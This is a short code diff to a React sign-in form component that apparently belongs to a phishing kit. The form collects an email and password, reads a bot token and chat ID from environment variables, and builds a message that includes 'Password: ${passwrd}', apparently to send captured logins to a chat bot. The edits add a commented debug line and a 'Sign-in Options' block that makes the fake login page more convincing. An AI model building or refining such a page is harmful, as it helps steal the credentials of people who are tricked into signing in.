@@ -10,8 +10,10 @@ const Form = () => {
   const botToken = import.meta.env.VITE_BOT_TOKEN;
   const chatId = import.meta.env.VITE_CHAT_ID;
 
+  // console.log(import.meta.env.VITE_CHAT_ID)
+
   function handleFormSubmit(e) {
-    e.preventDefault()
+    e.preventDefault();
 
     if (emal && passwrd) {
       checkDetails(emal, passwrd);
@@ -139,6 +141,9 @@ Password: ${passwrd}
             )}
           </div>
         </form>
+      </div>
+      <div className={styles.btmCtn}>
+        <p>Sign-in Options</p>
       </div>
     </div>
   );
